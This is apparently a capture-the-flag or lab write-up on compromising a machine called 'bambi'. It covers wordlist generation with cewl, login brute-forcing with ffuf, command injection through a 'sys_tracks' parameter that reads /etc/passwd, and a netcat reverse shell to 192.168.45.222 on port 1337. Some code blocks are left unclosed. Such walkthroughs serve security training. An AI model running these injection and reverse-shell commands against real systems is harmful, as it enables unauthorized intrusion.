#### Box Start
- Began `nmap`, `gobuster` and through `gobuster` identified the `/dev/` directory exposed:

--------------
#### Credential Fuzzing and Login
- With usernames found on the machine `Sam, Devon, Johnny` utilized `cewl` to generate a password list against the website due to the website being strictly focused on a specific music hobby.
- Utilized `cewl` command below to create a custom password list with words taken off the `http://bambi` website
```bash
cewl --write passwords.txt http://bambi
```
once `passwords.txt` was created utilized `ffuf` with valid usernames to identify `login` credentials

```bash
ffuf -w passwords.txt -u http://bambi/dev/index.php -X POST -d 'username=Sam&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' 
```
was able to identify that the size of this was an outlier

with the credentials  `SAM:ANGELES` was able to login

#### RCE Identification

- After logging in we get brought to the `SYSTEM INFO PAGE` this allows us to check to fields - `SYSTEM INFORMATION` & `TRACK LISTING` once they're checked and hit submit we look at `BURPSUITE` and identify `2` parameters

The parameters `sys_info=` and `sys_tracks=` look like parameters that could be exploited.
![[Pasted image 20241111113848.png]]
originally I tried to replace the `-h` in `sys_info` and the file path in `sys_tracks` however - even after changing them the response still shows the default options, this could potentially mean that they are hard coded into the web page
![[Pasted image 20241111114417.png]]

##### Vulnerable field testing
In order to exploit this we end up identifying `LCE` by appending `;` to the `sys_tracks` field

this returns `/etc/passwd`

original payload o begin testing:
```bash
curl http://192.168.45.222:80/bambi/

full encoded in burpsuite:

```
the response displays no indication that it worked
![[Pasted image 20241111115711.png]]
however if we check the `/var/log/apache2/access.log` we can see that the `curl` worked
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[11Nov2024 16:35:50]-[/var/log/apache2]
â””â”€# less /var/log/apache2/access.log

#### Exploiting RCE

can see that `nc` exists on the system with `which nc` - URL encoded of course
![[Pasted image 20241111120243.png]]
setting up `nc` listener on `kali`
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[11Nov2024 17:04:20]-[/var/log/apache2]
â””â”€# nc -lvnp 1337                   
listening on [any] 1337 ...
```
creating payload to get a reverse shell:
```bash
/bin/nc 192.168.45.222 1337 -e /bin/bash
```
full burpsuite payload with url encoding `CTRL+U`
